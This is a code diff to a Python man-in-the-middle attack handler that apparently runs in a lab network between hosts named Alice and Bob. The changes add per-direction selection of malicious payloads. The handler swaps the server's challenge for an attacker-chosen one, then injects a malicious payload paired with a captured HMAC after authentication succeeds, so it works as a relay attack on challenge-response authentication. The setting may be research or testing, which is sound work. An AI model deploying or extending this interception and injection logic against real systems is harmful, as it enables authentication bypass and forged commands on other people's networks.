@@ -50,6 +50,22 @@ class MitmAttackHandler:
         self.global_state = MitmGlobalState()
         if self.attack_enabled and self.attack_log:
             logging.info(f"[MITM] Attack mode enabled for direction {direction_name}")
+            logging.info(f"[MITM] Malicious payload: {self.attack_payload_hex[:50]}...")
+
+    def get_attack_payload_for_direction(self, source_ip, target_ip):
+        """Get the attack payload for the specific IP direction"""
+        # Determine the correct direction based on IP addresses
+        if source_ip == "10.10.20.13" and target_ip == "10.10.20.11":
+            direction = "bob_to_alice"
+        elif source_ip == "10.10.20.11" and target_ip == "10.10.20.13":
+            direction = "alice_to_bob"
+        else:
+            direction = self.direction_name
+            
+        payload = self.payload_handler.get_attack_payload(direction)
+        if self.attack_log:
+            logging.info(f"[MITM] IP direction: {source_ip} -> {target_ip}, mapped to direction: {direction}, payload: {payload[:50] if payload else 'None'}...")
+        return payload
 
     def force_tcp_rst(self, writer):
         """Force a TCP RST by setting SO_LINGER to 0 and closing the socket"""
@@ -97,7 +113,7 @@ class MitmAttackHandler:
             hex_str += "..."
         return hex_str
 
-    async def process_message(self, raw_msg, original_data, writer):
+    async def process_message(self, raw_msg, original_data, writer, source_ip=None, target_ip=None):
         should_forward = True
         if not self.attack_enabled:
             return should_forward
@@ -113,6 +129,8 @@ class MitmAttackHandler:
             logging.info(f"  State: {self.global_state.state['phase']}")
             logging.info(f"  Active: {self.global_state.state['active']}")
             logging.info(f"  Direction: {self.direction_name}")
+            if source_ip and target_ip:
+                logging.info(f"  IP Direction: {source_ip} -> {target_ip}")
             
         # Detect challenge from server (Bob) - try multiple formats
         challenge_detected = False
@@ -143,12 +161,15 @@ class MitmAttackHandler:
                     logging.info(f"[MITM] Challenge content: {raw_msg}")
                     logging.info(f"[MITM] Original data length: {len(original_data)} bytes")
                 
+                # Get the correct malicious payload for this direction
+                malicious_payload_hex = self.get_attack_payload_for_direction(source_ip, target_ip) if source_ip and target_ip else self.attack_payload_hex
+                
                 # Instead of forwarding Bob's challenge, send our own malicious challenge
                 malicious_bytes = b''
-                if self.attack_payload_hex:
+                if malicious_payload_hex:
                     try:
                         # Ensure hex string has even length
-                        hex_str = self.attack_payload_hex.strip()
+                        hex_str = malicious_payload_hex.strip()
                         if len(hex_str) % 2 != 0:
                             hex_str = hex_str + '0'  # Pad with zero if odd length
                         malicious_bytes = binascii.unhexlify(hex_str)
@@ -156,11 +177,11 @@ class MitmAttackHandler:
                             logging.info(f"[MITM] Sending malicious payload: {self.hex_dump(malicious_bytes)}")
                     except Exception as e:
                         logging.error(f"[MITM] Error decoding malicious payload: {e}")
-                        logging.error(f"[MITM] Hex string was: {self.attack_payload_hex}")
+                        logging.error(f"[MITM] Hex string was: {malicious_payload_hex}")
                         malicious_bytes = b''
                 else:
                     if self.attack_log:
-                        logging.warning("[MITM] No malicious payload configured, sending empty payload")
+                        logging.warning(f"[MITM] No malicious payload configured for direction {self.direction_name}, sending empty payload")
                 
                 # Send the malicious challenge to Alice
                 writer.write(malicious_bytes)
@@ -237,11 +258,14 @@ class MitmAttackHandler:
                     if self.attack_log:
                         logging.info(f"[MITM] *** Injecting malicious payload with captured HMAC after successful authentication ***")
                     
+                    # Get the correct malicious payload for this direction
+                    malicious_payload_hex = self.get_attack_payload_for_direction(source_ip, target_ip) if source_ip and target_ip else self.attack_payload_hex
+                    
                     # Craft the malicious package: malicious payload + captured HMAC
                     malicious_package = b''
-                    if self.attack_payload_hex:
+                    if malicious_payload_hex:
                         try:
-                            hex_str = self.attack_payload_hex.strip()
+                            hex_str = malicious_payload_hex.strip()
                             if len(hex_str) % 2 != 0:
                                 hex_str = hex_str + '0'
                             malicious_payload = binascii.unhexlify(hex_str)
